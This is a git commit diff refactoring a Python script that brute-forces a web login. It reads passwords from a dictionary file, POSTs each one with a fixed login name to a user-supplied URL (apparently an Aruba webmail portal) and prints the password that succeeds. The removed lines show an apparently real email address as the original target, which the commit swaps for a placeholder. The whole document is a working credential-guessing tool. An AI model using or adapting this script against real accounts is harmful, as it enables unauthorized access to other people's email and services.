b0077cf341d69edfde7af67a3caede2eaf1c38b4
Jessica Rojas <iajessiro@gmail.com>
2017-02-20 15:54:45 +0100

    refactor: refactoring production code

--- brute-force-dictionary.py
+++ brute-force-dictionary.py
@@ -9,15 +9,6 @@ import json
 import requests
 import string
 
-# construct the argument parse and parse the arguments
-arguments = argparse.ArgumentParser()
-arguments.add_argument("-d", "--dictionary", required=True,
-    help="Path to the dictionary")
-
-arguments.add_argument("-u", "--url", required=True,
-    help="Url ")
-
-
 def parseToJsonString(data):
     parseString = ""
 
@@ -26,14 +17,21 @@ def parseToJsonString(data):
     parseString = string.replace(parseString, 'err_text', '\"err_text\"')
     parseString = string.replace(parseString, 'url', '\"url\"')
 
-    # print parseString
     return parseString
+
+# construct the argument parse and parse the arguments
+arguments = argparse.ArgumentParser()
+arguments.add_argument("-d", "--dictionary", required=True,
+    help="Path to the dictionary")
+
+arguments.add_argument("-u", "--url", required=True,
+    help="Url ")
 
 args = vars(arguments.parse_args())
 
 wordlist = open(args["dictionary"])
 
-#
+# Reading dictionary content
 for word in wordlist.readlines():
 
     # headers = {'content-type': 'application/json'}
@@ -42,7 +40,7 @@ for word in wordlist.readlines():
     url = args["url"]
 
     data = {
-        'login': 'grafica@imaginecreative.it',
+        'login': 'someuser@somedomain.com',
         'password': word.strip("\n"),
         'lang': 'en',
         'theme': 'ext_aruba/classic'
@@ -56,7 +54,7 @@ for word in wordlist.readlines():
     # print "\n\n"
     # print r.text
 
-    # jsonString = '{"status":{"err_code":1,"err_text":"Failure during authentication!"},"url":""}'
+    # sample response '{"status":{"err_code":1,"err_text":"Failure during authentication!"},"url":""}'
     jsonString = parseToJsonString(r.text)
 
     try:
@@ -64,9 +62,6 @@ for word in wordlist.readlines():
 
         # pretty printing of json-formatted string
         # print json.dumps(decoded, sort_keys=True, indent=4)
-
-        # print "JSON parsing example: ", decoded['status']['err_code']
-        # print "Complex JSON parsing example: ", decoded['url']
 
         if decoded['status']['err_code'] == 0:
             print "Authorized with password: %s" %(word.strip("\n"))
